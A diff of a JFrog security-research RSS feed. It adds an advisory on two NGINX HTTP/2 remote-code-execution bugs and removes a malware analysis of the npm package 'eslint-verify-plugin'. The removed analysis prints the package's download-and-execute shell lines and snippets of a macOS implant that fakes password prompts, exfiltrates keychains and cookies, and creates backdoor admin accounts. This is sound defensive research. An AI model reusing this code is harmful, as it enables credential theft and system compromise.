@@ -4,7 +4,7 @@
         <title>JFrog Security Real Time Posts</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest security real-time threat posts from JFrog Security Research.</description>
-        <lastBuildDate>Wed, 18 Nov 2026 16:25:30 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 18 Nov 2026 19:04:54 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -167,6 +167,149 @@ Even with those flaws, one `.pth` line paired with an untouched dependency pin g
 [image3]: /img/RealTimePostImage/post/agent-framework-hijack/image3.png
 [image4]: /img/RealTimePostImage/post/agent-framework-hijack/image4.png
 [image5]: /img/RealTimePostImage/post/agent-framework-hijack/image5.png]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Nginx2Shell: All You Need to Know About CVE-2026-123007 and CVE-2026-123633]]></title>
+            <link>https://research.jfrog.com/post/nginx2shell-all-you-need-to-know-about-cve-2026-123007-and-cve-2026-123633/</link>
+            <guid>https://research.jfrog.com/post/nginx2shell-all-you-need-to-know-about-cve-2026-123007-and-cve-2026-123633/</guid>
+            <pubDate>Wed, 18 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[JFrog Security Research is tracking CVE-2026-123007 and CVE-2026-123633, two CRITICAL-severity NGINX vulnerabilities (Nginx2Shell) that allow unauthenticated remote code execution in NGINX itself, independent of the application running behind it. We break down who is affected, the bug flow, the shipped fix, and how to detect exploitation attempts.]]></description>
+            <content:encoded><![CDATA[
+![](/img/RealTimePostImage/post/nginx2shell/banner.png)
+
+JFrog Security is tracking two Critical severity NGINX vulnerabilities ([CVE-2026-123007](https://www.cve.org/CVERecord?id=CVE-2026-123007), [CVE-2026-123633](https://www.cve.org/CVERecord?id=CVE-2026-123633)), disclosed today and referred to as Nginx2Shell. The vulnerabilities allow unauthenticated remote code execution in NGINX itself, independent of the application running behind it.
+
+On November 18, [F5](https://nginx.org/en/security_advisories.html) released NGINX 1.31.9 and 1.30.7 to address both vulnerabilities, each assigned a CVSS v4.0 score of 9.2.
+
+![](/img/RealTimePostImage/post/nginx2shell/image1.png)
+
+The disclosure comes only a month after PHP2Shell and a day after Java4Shell, and follows the same pattern. Old memory bugs in core web infrastructure, found by several research teams at the same time. CVE-2026-123007 has been in NGINX for more than a decade and CVE-2026-123633 for nearly six years. With NGINX serving roughly 30% of the web, even a narrow set of conditions translates into a very large number of exposed servers.
+
+## **Who Is Affected**
+
+NGINX servers that have all of the following attributes are affected -
+
+**Versions:**
+
+* NGINX Open Source 1.9.5 through 1.31.8 (CVE-2026-123007)
+* NGINX Open Source 1.19.7 through 1.31.8 (CVE-2026-123633)
+* NGINX Plus R33 and later, before the fixed builds listed below
+
+**Configuration:**
+HTTP/2 enabled in the NGINX configuration file. CVE-2026-123633 also requires NGINX to proxy requests to a backend (ex. via the `proxy_pass` directive)
+
+**Environment:**
+NGINX reachable directly over HTTP/2. CVE-2026-123007 was confirmed on 64-bit servers over HTTPS, even when serving static files only. A CDN or WAF that terminates HTTP/2 in front of NGINX may block parts of the attack.
+
+Note that at the time of writing, the official NGINX Docker images have not been updated yet. Products that bundle NGINX, such as OpenResty and ingress controllers, remain affected until they ship an updated build. kubernetes/ingress-nginx is archived and will not receive a fix.
+
+## **How common is HTTP/2 on NGINX?**
+
+HTTP/2 is now the standard way browsers talk to websites. According to the [HTTP Archive Web Almanac](https://almanac.httparchive.org/en/2024/http), almost 80% of web requests are served over HTTP/2 or newer. [W3Techs](https://w3techs.com/technologies/segmentation/ce-http2/web_server) lists NGINX as the second most common server among HTTP/2 websites, after Cloudflare.
+
+NGINX does not enable HTTP/2 by default, but it takes a single directive to turn it on, and most HTTPS deployments do. The official NGINX packages and Docker images ship with the HTTP/2 module built in.
+
+Not every HTTP/2 site is exposed in the same way. NGINX servers behind a CDN usually receive HTTP/2 traffic from the CDN rather than from the attacker, which may block parts of the attack. The most exposed are NGINX servers that face the internet directly, such as self-hosted web servers, Kubernetes ingress controllers, load balancers and appliances.
+
+![](/img/RealTimePostImage/post/nginx2shell/image2.png)
+
+## **Am I vulnerable?**
+
+Run the following on the NGINX host/container:
+
+```bash
+# NGINX version
+nginx -v
+# Is HTTP/2 enabled? (any output means yes)
+nginx -T 2>/dev/null | grep -nE '^\s*(http2\s+on\b|listen\b[^#]*\bhttp2\b)'
+# Is NGINX passing requests to an upstream? (CVE-2026-123633)
+nginx -T 2>/dev/null | grep -nE '\b(proxy|fastcgi|uwsgi|scgi|grpc|memcached|tunnel)_pass\b'
+```
+
+Your server is affected by CVE-2026-123007 if it runs a version below 1.31.9 (mainline) or 1.30.7 (stable) and the HTTP/2 check returns any output. If the upstream check also returns output, it is affected by CVE-2026-123633 as well.
+
+## **Remediation**
+
+* **Upgrade to NGINX 1.31.9 (mainline) or 1.30.7 (stable). NGINX Plus users should upgrade to 37.0.8.1 or 37.3.0.1.**
+* If you cannot upgrade: You can temporarily disable HTTP/2. Set `http2 off` in the affected server blocks (NGINX 1.25.1 and later) and remove the `http2` parameter from your listen directives. Reload NGINX, confirm the old worker processes have exited, and turn HTTP/2 back on after upgrading.
+
+## **The Bugs**
+
+The vulnerabilities enable the following:
+
+* Remote code execution
+* Information disclosure
+* Denial of service
+
+Both are rated CVSS v4.0 9.2 (8.1 under CVSS v3.1), while [nginx.org](http://nginx.org) rates CVE-2026-123007 as major and CVE-2026-123633 as medium.
+
+**CVE-2026-123007:** An integer underflow in HTTP/2 flow control that leads to an out-of-bounds memory copy. Present since NGINX 1.9.5 (2015) and exploitable even when NGINX only serves static files.
+
+![](/img/RealTimePostImage/post/nginx2shell/image3.png)
+
+**CVE-2026-123633:** A use-after-free in HTTP/2 connection handling, triggered when NGINX closes a connection that is still serving a request. Present since NGINX 1.19.7 and requires NGINX to pass requests to an upstream while running low on free connections.
+
+![](/img/RealTimePostImage/post/nginx2shell/image4.png)
+
+## **Technical Details**
+
+[Wiz Research](https://www.wiz.io/blog/nginx-http2-rce-vulnerabilities) disclosed both vulnerabilities, which were independently found by Wiz, Ikotas Labs, Metnir, [Rapid7](https://www.rapid7.com/blog/post/ve-cve-2026-123007-critical-nginx-http-2-integer-underflow-leads-to-rce-fixed/) and Xint, many of them with the help of AI-assisted code analysis. The NGINX fix commits credit Xint.io for CVE-2026-123007 and Albert from Vexera AI for CVE-2026-123633. Rapid7 also published a public PoC for CVE-2026-123007.
+
+Both bugs live in the way NGINX keeps track of HTTP/2 connections. The flow looks like this:
+
+**CVE-2026-123007**
+
+1. HTTP/2 limits how much data a server may send before the client asks for more. NGINX tracks this allowance in a counter.
+2. When a stream is cancelled, NGINX adds the unsent data back to the counter without checking the protocol maximum.
+3. Once the counter passes that maximum, the check on new WINDOW_UPDATE frames wraps around and lets the attacker keep raising it.
+4. The oversized counter turns into a negative length when NGINX prepares data to send, and the TLS layer copies memory out of bounds. This can leak memory and corrupt the heap.
+
+![](/img/RealTimePostImage/post/nginx2shell/image5.png)
+
+**CVE-2026-123633**
+
+1. NGINX keeps a list of idle connections it can close when it runs out of free connections.
+2. A client that sends only part of an HTTP/2 HEADERS frame gets its connection put on that list while NGINX waits for the rest.
+3. When the rest arrives and a request starts, the connection is never taken off the list.
+4. Later, while opening a connection to the upstream, NGINX may pick this busy connection to close and free its memory. The request keeps using the freed memory, a classic use-after-free.
+
+![](/img/RealTimePostImage/post/nginx2shell/image6.png)
+
+## **The Fix**
+
+The fix addresses the following:
+
+**The flow-control counter respects the protocol maximum** ([e27f5fa84fe](https://github.com/nginx/nginx/commit/e27f5fa84fe6e98505e70bc543b748747dad0a3b)): NGINX now tracks the data already queued for sending and takes it into account when checking WINDOW_UPDATE frames, so the counter can no longer wrap around.
+
+![](/img/RealTimePostImage/post/nginx2shell/image7.png)
+
+**Busy connections leave the idle list** ([2df48a501d0](https://github.com/nginx/nginx/commit/2df48a501d0fb8212b7d39dffeeff5876332ba59)): a one-line fix marks the connection as no longer reusable once a request starts, so NGINX can no longer close it while it is still in use.
+
+![](/img/RealTimePostImage/post/nginx2shell/image8.png)
+
+## **Detection**
+
+There are no confirmed indicators of compromise yet, but the following signs are worth investigating:
+
+* NGINX worker crashes in the error log, such as `worker process 1234 exited on signal 11`
+* Unexpected commands or processes spawned by NGINX worker processes
+* Long-lived HTTP/2 connections transferring unusually large amounts of data, a possible sign of a CVE-2026-123007 attempt
+
+```bash
+# Look for worker crashes
+grep "exited on signal" /var/log/nginx/error.log
+# In containers, NGINX logs to stderr
+docker logs <container> 2>&1 | grep "exited on signal"
+```
+
+## **How Can JFrog Help?**
+
+JFrog is tracking both vulnerabilities and helping organizations prepare to respond.
+
+JFrog Xray and Catalog already include CVE-2026-123007 and CVE-2026-123633 in their vulnerability intelligence, helping teams identify these issues through their existing security workflows.
+
+Additionally, our security team has deployed contextual scanners to determine the applicability of these CVEs for customers of JFrog Advanced Security.
+]]></content:encoded>
         </item>
         <item>
             <title><![CDATA[Java4Shell: What We Know About the Critical OpenJDK RCE Vulnerability (CVE-2026-114938)]]></title>
@@ -14139,248 +14282,6 @@ All stages from getting RCE to repository compromise:
 ### Impact Beyond a Single Repository
 
 Ceph is a widely deployed distributed storage system powering enterprise block, object, and file storage. Compromise could affect downstream distributions, cloud providers, and enterprise deployments. CI compromise can cascade via PR bots, workflow automations, and ChatOps, potentially affecting multiple downstream consumers.
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Three Stages Deep: A Malicious npm Package Delivering a Full-Featured macOS RAT]]></title>
-            <link>https://research.jfrog.com/post/three-stages-deep-a-malicious-npm-package/</link>
-            <guid>https://research.jfrog.com/post/three-stages-deep-a-malicious-npm-package/</guid>
-            <pubDate>Wed, 18 Feb 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[The JFrog Security Team has identified a malicious npm package named eslint-verify-plugin that deploys a sophisticated multi-stage infection chain, ultimately delivering a full-featured Mythic/Apfell macOS RAT capable of credential theft, screen capture, and backdoor account creation.]]></description>
-            <content:encoded><![CDATA[
-The JFrog Security Team has identified a LIVE malicious npm package named `eslint-verify-plugin`. This package masquerades as a legitimate ESLint utility while deploying a sophisticated, multi-stage infection chain targeting macOS and Linux environments.
-
-![](/img/RealTimePostImage/post/eslint-verify-plugin/package_json.png)
-
-## **Technical Analysis: Initial Stages**
-
-### **Stage 1: The Preinstall Hook**
-
-Upon installation, the package triggers `index.js`, which serves as a gatekeeper for the infection. It explicitly filters for non-targeted operating systems:
-
-```javascript
-if (platform !== "linux" && platform !== "darwin") process.exit(0);
- 
-const filename = platform === "linux" ? "x-ya-npmdep_linux.sh" : "x-ya-npmdep_macos.sh";
-```
-
-The script writes a platform-specific shell script to disk, sets execution permissions (`chmod 755`), and spawns it as a **detached process**. This allows the `npm install` command to complete silently while the malware continues its execution in the background.
- 
-### **Stage 2: Payload Delivery Infrastructure**  The package fetches the next stage of the attack from two different endpoints:
-
-| Platform | Payload Source URL | Method |
-| :---- | :---- | :---- |
-| **macOS** | hxxps\[://\]x-ya\[.\]ru/FvXnR/9a8c2a83f66f49b88e36d28894a34009  | curl |
-| **Linux** | hxxps\[://\]functions\[.\]yandexcloud\[.\]net/d4elc6rmqc9fbfsd7m2s?id=3 | curl |
-
-The generated shell scripts each download and execute large obfuscated binaries:
-
-**Mac:**
-
-```shell
-(zsh -c "curl -Ls [Payload_URL]| osascript -l JavaScript" &) &
-```
-
-**Linux:**
-
-```shell
-{ wget --no-check-certificate -q -O ./.node-exporter [Payload_URL] ||  curl -k -o ./.node-exporter -sO [Payload_URL]; } ; chmod +x ./.node-exporter && (exec -a node-exporter ./.node-exporter &)
-```
-
-![](/img/RealTimePostImage/post/eslint-verify-plugin/VT_screenshot.png)
-
-### **Stage 3: The Final Payloads**
-
-### Linux final payload:
-
- A malicious binary **`node-exporter`** (4a37a431b3768824e31622d5eb9ad7505fa0afdbbec8d0505d41c1c3af37bc5a) served by the Yandex Cloud function (hxxps\[://\]x-ya\[.\]ru/FvXnR/node-exporter) is piped directly to bash for execution.
-
-The binary **`node-exporter`** is a Poseidon agent for the Mythic C2 framework, a well-known open-source post-exploitation platform. It is classified as a trojan/backdoor (threat category: trojan family).   
-It is a 64-bit ELF binary written in Go, disguised as the legitimate Prometheus node-exporter monitoring tool.   
-Furthermore it communicates over HTTPS with `functions\[.\]yandexcloud\[.\]net`, abusing Yandex Cloud Functions as C2 infrastructure.   
-The binary is not packed. Poseidon supports a full range of post-exploitation capabilities including file operations, credential harvesting, and lateral movement.   
-**Currently 26/65 vendors on VirusTotal flag it as malicious**.
-
-### MacOS final payload
-
-The downloaded obfuscated script (obfuscated with Obfuscator.io/javascript-obfuscator, featuring string array rotation, hex-renamed identifiers, and proxy wrapper functions) executes a Mythic/Apfell open source C2 agent using `osascript -l JavaScript`
-
-![](/img/RealTimePostImage/post/eslint-verify-plugin/obfuscated_code.png)
-
-#### **What gets stolen \- data exfiltration deep dive**
-
-Once the Mythic agent ([https://github.com/its-a-feature/Mythic](https://github.com/its-a-feature/Mythic)) is running, the attacker can remotely trigger data collection commands. But even before any commands are issued, the agent immediately fingerprints the victim machine on `initialization.Host` fingerprinting on startup.  
-The payload itself is an Apfell agent ([https://github.com/MythicAgents/apfell](https://github.com/MythicAgents/apfell)), Mythic's JXA (JavaScript for Automation) implant designed for macOS. This is evident from the code The agent constructor harvests system information the moment it is instantiated, before any C2 communication begins:
-
-```javascript
-class agent {
-    constructor() {
-        this.procInfo = $.NSProcessInfo.processInfo;
-        this.hostInfo = $.NSHost.currentHost;
-        this.id = "";
-        this.user = ObjC.deepUnwrap(this.procInfo.userName);
-        this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
-        this.ip = ObjC.deepUnwrap(this.hostInfo.addresses).sort()
-                      .filter((a) => a !== "127.0.0.1");
-        this.pid = this.procInfo.processIdentifier;
-        this.host = ObjC.deepUnwrap(this.hostInfo.names);
-        this.environment = ObjC.deepUnwrap(this.procInfo.environment);
-        this.uptime = this.procInfo.systemUptime;
-        this.args = ObjC.deepUnwrap(this.procInfo.arguments);
-        this.osVersion = this.procInfo.operatingSystemVersionString.js;
-        this.uuid = "6a5562b3-431f-49c5-a17d-41adce6caded";
-        this.checked_in = false;
-    }
-}
-```
-
-This collects the username, full display name, all non-loopback IP addresses, hostname, the entire environment variable set (PATH, HOME, AWS keys, tokens \-- anything exported), process arguments, OS version, and system uptime. All of this is sent to the C2 server during the initial checkin, giving the attacker a complete profile of the target before issuing a single command.
-
-Beyond this passive collection, the agent targets several high-value categories via remote commands:
-
-**Credential stealing via fake password dialog.** The agent displays a native macOS dialog that mimics a system password prompt. The `hiddenAnswer: true` flag masks the input, making it indistinguishable from a real OS prompt:
-
-![](/img/RealTimePostImage/post/eslint-verify-plugin/demo_prompt2.png)
-
-```javascript
-var result = currentApp.displayDialog(
-    "User's password is required to proceed.",
-    {
-        withTitle: title || "CustomTitle",
-        withIcon: icon || "caution",
-        buttons: ["OK", "Cancel"],
-        defaultButton: "OK",
-        hiddenAnswer: true
-    }
-);
-return JSON.stringify({ user: apfell.user, password: result.textReturned });
-```
-
-The victim sees what looks like a routine macOS password request. Whatever they type gets sent straight to the C2 server along with their username.
-
-**Browser bookmarks.** The agent reads Chrome's bookmark JSON directly from disk and recursively walks the bookmark tree, extracting every URL with its folder and title:
-
-```javascript
-var chromePath = ObjC.unwrap($.NSHomeDirectory()) +
-    "/Library/Application Support/Google Chrome/Default/Bookmarks";
-
-function parseBookmarkFolder(folder, folderName) {
-    for (var i = 0; i < folder.children.length; i++) {
-        var child = folder.children[i];
-        if (child.type === "url") {
-            results.push({ "Folder Name": folderName, title: child.name, url: child.url });
-        } else if (child.type === "folder") {
-            parseBookmarkFolder(child, child.name);
-        }
-    }
-}
-```
-
-This reveals the victim's internal tools, dashboards, admin panels, cloud consoles, and corporate resources, all useful for lateral movement.
-
-**Clipboard contents.** A single call reads whatever the victim last copied \-- passwords, API keys, seed phrases, internal URLs:
-
-```javascript
-var pasteboard = $.NSPasteboard.generalPasteboard;
-var content = pasteboard.stringForType($.NSPasteboardTypeString);
-```
-
-**File exfiltration**. The agent leaks the following files  \-
-
-*  /Library/Keychains/login.keychain-db  
-* /Library/Application Support/Google/Chrome/Default/Cookies  
-*  /Library/Application Support/Google/Chrome/Default/Login Data  
-*  /Library/Application Support/Google Chrome/Default/Bookmarks
-
-Files are read, base64-encoded, chunked into 512KB segments, and uploaded to the C2 server piece by piece:
-
-```javascript
-var fileData = $.NSFileHandle.fileHandleForReadingAtPath(filePath).readDataToEndOfFile;
-var base64Data = fileData.base64EncodedStringWithOptions(0);
-
-var chunkSize = 512000;
-var totalChunks = Math.ceil(base64Data.length / chunkSize);
-for (var chunkNum = 0; chunkNum < totalChunks; chunkNum++) {
-    var chunk = base64Data.slice(chunkNum * chunkSize, (chunkNum + 1) * chunkSize);
-    C2.postResponse(task.id, { download: { chunk_data: chunk, chunk_num: chunkNum, total_chunks: totalChunks }});
-}
-```
-
-This chunked approach lets the attacker exfiltrate large files (SSH keys, wallets, databases) without triggering size-based network alerts.
-
-**Screenshots.** The agent silently captures the display using `screencapture -x` (the \-x flag suppresses the shutter sound), uploads the image, then deletes the temp file:
-
-```javascript
-var tmpFile = "/tmp/" + get_random_string(10) + ".png";
-currentApp.doShellScript("screencapture -x " + tmpFile);
-var fileData = $.NSData.alloc.initWithContentsOfFile(tmpFile);
-var b64 = ObjC.unwrap(fileData.base64EncodedStringWithOptions(0));
-$.NSFileManager.defaultManager.removeItemAtPathError(tmpFile, null);
-```
-
-**Filesystem reconnaissance.** The ls command returns full metadata for every file \-- permissions, owner, UID, group, file type, creation/modification dates, and hidden status \-- giving the attacker a detailed map of the target system:
-
-```javascript
-results.push({
-    name: ObjC.unwrap(item),
-    permission: ObjC.unwrap(attrs.objectForKey($.NSFilePosixPermissions)),
-    size: ObjC.unwrap(attrs.objectForKey($.NSFileSize)),
-    user: ObjC.unwrap(attrs.objectForKey($.NSFileOwnerAccountName)),
-    type: ObjC.unwrap(attrs.objectForKey($.NSFileType)),
-    isHidden: ObjC.unwrap(attrs.objectForKey("NSFileExtensionHidden"))
-});
-```
-
-**Backdoor account creation.** Perhaps the most aggressive capability: the agent can create a new macOS user with admin privileges, a home directory, and a password, all via `dscl` commands run with stolen admin credentials:
-
-```javascript
-currentApp.doShellScript("dscl . create /Users/" + username + " UserShell " + shell,
-    { administratorPrivileges: true, userName: adminUser, password: adminPass });
-currentApp.doShellScript("dseditgroup -o edit -a " + username + " -t user admin",
-    { administratorPrivileges: true, userName: adminUser, password: adminPass });
-currentApp.doShellScript("mkdir \"" + homeDir + "\"",
-    { administratorPrivileges: true, userName: adminUser, password: adminPass });
-```
-
-This creates persistent access that survives even if the original agent is discovered and removed.
-
-## **Remediation**
-
-Affected users who installed this package should:
-
-1. **Uninstall the malicious package**  `npm uninstall eslint-verify-plugin` 
-2. **Isolate & Audit:** Check for unauthorized user accounts via `dscl . list /Users`  
-3. **Credential Rotation:** Immediately change all passwords and rotate SSH keys, API tokens, and session cookies.  
-4. **Persistence Check:** Inspect LaunchAgents and LaunchDaemons for suspicious `.plist` files.
-If present, its `ProgramArguments` will contain `/usr/bin/osascript -l JavaScript -e` with an embedded URL fetching the Mythic payload. Remove the `plist` file to disable persistence.   
-5. **Security Baseline:** Re-image affected machines if possible to ensure all hidden backdoors are removed.
-
-## **Conclusions**
-
-The **eslint-verify-plugin** package is a direct example of how a malicious npm package can escalate from a simple installation hook to a full-system compromise. By masquerading as a legitimate utility, the attackers successfully concealed a multi-stage infection chain.
-
-The capabilities of the Mythic/Apfell RAT deployed here \- ranging from silent screen captures and credential harvesting to the creation of administrative backdoors-demonstrate the high level of control an attacker gains through this vector. This case confirms that the preinstall hook remains a critical entry point for persistent, platform-specific malware targeting both macOS and Linux environments.
-
-This package is already detected by JFrog Xray and JFrog Curation, under the Xray ID listed in the IoC section below.
-
-##  **Indicators of Compromise (IOCs):** 
-
-| Indicator | Value |
-| :---- | :---- |
-| Package Name | eslint-verify-plugin  |
-| NPM Version | 1.4.3 |
-| XRAY-ID | XRAY-943671 |
-| C2 Shortlink | hxxps\[://\]x-ya\[.\]ru/FvXnR/a5aef90 |
-| AES PSK (Base64) | EGEqvmewqbDmt/y+YTXh/2tpQ4hME0SMKsuF/lY51p0= |
-| Agent UUID | 6a5562b3-431f-49c5-a17d-41adce6caded |
-| Kill Date | 2027-02-10 |
-| C2 URI Path | d4erloflq56bidfugr9m |
-| Framework | Mythic / Apfell (JXA)6 |
-| Linux Binary Name  | node-exporter  |
-| Linux Binary SHA256 | 4a37a431b3768824e31622d5eb9ad7505fa0afdbbec8d0505d41c1c3af37bc5a  |
-| Linux Binary URL | hxxps\[://\]x-ya\[.\]ru/FvXnR/node-exporter  |
-| Linux Payload Source | hxxps\[://\]functions\[.\]yandexcloud\[.\]net/d4elc6rmqc9fbfsd7m2s?id=3  |
-
 ]]></content:encoded>
         </item>
     </channel>
